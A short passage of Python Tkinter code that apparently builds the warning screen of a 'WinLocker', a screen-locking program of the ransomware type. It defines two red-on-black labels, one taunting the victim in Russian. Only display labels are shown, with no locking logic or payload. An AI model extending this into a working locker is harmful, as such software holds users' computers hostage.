...
txt_one = Label(window, text='WinLocker garhgr', font=("Arial Bold", fontsizeHding), fg='red', bg='black')
txt_two = Label(window, text='КАК ты попал на этот винлокер( :)', font=("Arial Bold", fontsizeHding), fg='red', bg='black')
